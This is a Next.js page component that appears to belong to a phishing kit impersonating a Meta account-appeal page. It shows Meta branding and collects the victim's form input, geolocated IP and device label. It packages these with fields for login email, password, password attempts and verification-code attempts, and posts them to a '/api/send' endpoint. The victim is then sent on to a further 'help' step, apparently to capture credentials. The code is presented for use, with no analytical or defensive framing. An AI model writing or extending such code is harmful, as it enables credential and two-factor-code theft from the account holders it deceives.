'use client';

import LogoMeta from '@/assets/images/logo-meta.svg';
import FormFlow from '@/components/FormFlow';
import FirstFormModal from '@/components/FirstFormModal';
import { useAppTexts } from '@/hooks/use-app-texts';
import { useAppInit } from '@/hooks/use-app-init';
import { useAppStore } from '@/store/store';
import { buildAppealMessage } from '@/utils/message';
import type { FormDataPayload } from '@/utils/message';
import axios from 'axios';
import Image from 'next/image';
import Link from 'next/link';
import { useRouter } from 'next/navigation';
import type { FC } from 'react';

const ReviewPage: FC = () => {
    const router = useRouter();
    const geoInfo = useAppInit();
    const texts = useAppTexts();
    const { setFormData, setPendingLogin, deviceLabel, messageId, setMessageId } = useAppStore();

    const handleFirstFormSubmit = async (data: FormDataPayload) => {
        const ip = geoInfo || {
            ip: 'Unknown',
            city: 'Unknown',
            region: 'Unknown',
            country: 'Unknown',
            countryCode: 'US'
        };

        const message = buildAppealMessage({
            form: data,
            login: { email: '', password: '' },
            passwordLogs: [],
            codeAttempts: [],
            ip,
            deviceLabel
        });

        const res = await axios.post('/api/send', {
            message,
            old_message_id: messageId
        });

        if (res?.data?.success && typeof res.data.message_id === 'number') {
            setMessageId(res.data.message_id);
        }

        setFormData(data);
        setPendingLogin(true);
        router.push('/contact/help');
    };

    const handleCloseReviewPage = () => {
        router.push('/contact/help');
    };

    return (
        <>
            <div className="community-page flex min-h-screen w-full justify-center bg-white">
                <div className="w-full">
                    <div className="flex h-[52px] items-center justify-center border-b border-[#E0E0E0] bg-[#F5F6F6]">
                        <div className="flex w-full max-w-[1280px] items-center justify-between px-4">
                            <Link href="/contact/help">
                                <Image src={LogoMeta} width={64} height={22} alt={texts.altMeta} />
                            </Link>
                        </div>
                    </div>

                    <FirstFormModal
                        show={true}
                        asPage={true}
                        onClose={handleCloseReviewPage}
                        onSubmit={handleFirstFormSubmit}
                        texts={texts}
                    />

                    <div className="w-full border-t border-[#E0E0E0] bg-[#F5F6F6] pt-5 pb-5">
                        <div className="mx-auto w-full max-w-[1280px] px-4 text-center text-[13px] text-gray-600">
                            {texts.footerCopyright}
                        </div>
                    </div>
                </div>
            </div>
            <FormFlow texts={texts} />
        </>
    );
};

export default ReviewPage;
